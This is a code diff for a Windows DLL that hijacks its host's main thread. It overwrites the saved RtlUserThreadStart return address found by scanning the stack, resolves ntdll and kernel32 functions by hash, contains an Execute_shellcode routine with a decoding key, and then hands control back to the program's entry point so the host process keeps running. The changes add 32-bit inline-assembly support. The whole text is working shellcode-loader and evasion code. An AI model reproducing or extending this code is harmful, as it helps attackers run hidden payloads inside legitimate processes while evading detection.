@@ -6,15 +6,24 @@ int Ip_off = 0xf8;
 int step = 0x10;
 size_t addr_max = 0x7FFFFFFF0000;
 size_t addr_min = 0x7FF000000000;
+void functions_wrap(LPTHREAD_START_ROUTINE a, LPVOID b) {
+    function(a, b);
+}
 #else
 int Cx_off = 0xac;
 int Ip_off = 0xb4;
 int step = 4;
 size_t addr_max = 0x7FFFF000;
 size_t addr_min = 0x70000000;
+__declspec(naked) void functions_wrap() {
+    __asm {
+        push ebx
+        push eax
+        call function
+    }
+}
 #endif
 
-void function(LPTHREAD_START_ROUTINE oep, LPVOID parameter);
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
@@ -25,7 +34,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         NT_TIB* teb = NtCurrentTeb();
         intptr_t* StackBase = teb->StackBase;
         StackBase = (intptr_t*)((char*)StackBase - sizeof(intptr_t));
-        intptr_t* RtlUserThreadStart = 0;
+        PHANDLE RtlUserThreadStart = 0;
 
         while (RtlUserThreadStart == 0)
         {
@@ -34,6 +43,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
                 if (addr_min < *StackBase && *StackBase < addr_max)
                 {
                     RtlUserThreadStart = StackBase;
+                    ntdll_RtlUserThreadStart = *RtlUserThreadStart;
                 }
             }
             if ((intptr_t)teb->StackBase - (intptr_t)StackBase > 0x10000)
@@ -43,10 +53,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
             }
             StackBase = (intptr_t*)((char*)StackBase - step);
         }
-        ntdll_RtlUserThreadStart = *RtlUserThreadStart;
         printf("This is dll main\n");
         printf("Get RtlUserThreadStart address: %p, Hijack main thread!\n", ntdll_RtlUserThreadStart);
-        *RtlUserThreadStart = &function;
+        *RtlUserThreadStart = &functions_wrap;
         break;
     }
     case DLL_PROCESS_DETACH:
@@ -59,8 +68,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     return TRUE;
 }
 
-
-intptr_t* GetImageBase(intptr_t* addr)
+HANDLE GetImageBase(HANDLE addr)
 {
     while (*(long long*)addr != 0x0300905A4D)
     {
@@ -70,7 +78,7 @@ intptr_t* GetImageBase(intptr_t* addr)
 }
 
 
-intptr_t* GetImageBase32_kernel32(intptr_t* addr)
+HANDLE GetImageBase32_kernel32(HANDLE addr)
 {
     while (*(long long*)addr != 0x0300905A4D)
     {
@@ -88,12 +96,9 @@ void Execute_shellcode(char* param)
 
 void function(LPTHREAD_START_ROUTINE oep, LPVOID parameter)
 {
-    intptr_t RtlUserThreadStart = ntdll_RtlUserThreadStart;
-    intptr_t ThreadInitThunkFunction = 0;
+    HANDLE ThreadInitThunkFunction = 0;
     BYTE* POINT = (BYTE*)ntdll_RtlUserThreadStart;
     BYTE* point = (BYTE*)ntdll_RtlUserThreadStart;
-    typedef void (WINAPI* RtlUserThreadStart_func)(LPTHREAD_START_ROUTINE, LPVOID);
-    RtlUserThreadStart_func func = (RtlUserThreadStart_func)ntdll_RtlUserThreadStart;
     key = 0x47;
     Ntdll_handle = 0;
     Kernel32_handle = 0;
@@ -164,17 +169,16 @@ void function(LPTHREAD_START_ROUTINE oep, LPVOID parameter)
         exit(-1);
         
     }
-    RtlUserThreadStart = (RtlUserThreadStart >> 12) << 12;
 #ifdef _WIN64
-    ThreadInitThunkFunction = (ThreadInitThunkFunction >> 12) << 12;
-    Kernel32_handle = GetImageBase(ThreadInitThunkFunction);
+    Kernel32_handle = GetImageBase(((intptr_t)ThreadInitThunkFunction >> 12) << 12);
 #else
-    ThreadInitThunkFunction = (ThreadInitThunkFunction >> 16) << 16;
-    Kernel32_handle = GetImageBase32_kernel32(ThreadInitThunkFunction);
+    Kernel32_handle = GetImageBase32_kernel32(((intptr_t)ThreadInitThunkFunction >> 16) << 16);
 #endif
-    Ntdll_handle = GetImageBase(RtlUserThreadStart);
+    Ntdll_handle = GetImageBase(((intptr_t)ntdll_RtlUserThreadStart >> 12) << 12);
+    exe_handle = GetImageBase(((intptr_t)oep >> 12) << 12);
     printf("Ntdll: %p\n", Ntdll_handle);
     printf("Kernel32: %p\n", Kernel32_handle);
+    printf("exe_handle: %p\n", exe_handle);
 
     typedef NTSTATUS(WINAPI* FRtlQueueWorkItem)(void* function, PVOID context, ULONG flags);
     FRtlQueueWorkItem RtlQueueWorkItem = GetFunctionAddressByHash(Ntdll_handle, 0x24318c7a);
@@ -187,14 +191,19 @@ void function(LPTHREAD_START_ROUTINE oep, LPVOID parameter)
         //printf("Fail\n");
         exit(-1);
     }
-    
+
+    printf("We can back to exe oep.\n");
+
 #ifdef _WIN64
-    printf("Running on x64, We can back to exe oep.\n");
+    typedef void (WINAPI* RtlUserThreadStart_func)(LPTHREAD_START_ROUTINE, LPVOID);
+    RtlUserThreadStart_func func = (RtlUserThreadStart_func)ntdll_RtlUserThreadStart;    
     func(oep, parameter);
 #else
-    printf("Everything down, exit\n");
-    system("pause");
-    exit(0);
+    __asm{
+        mov eax,oep
+        mov ebx, parameter
+        call ntdll_RtlUserThreadStart
+    }
 #endif
 }
 
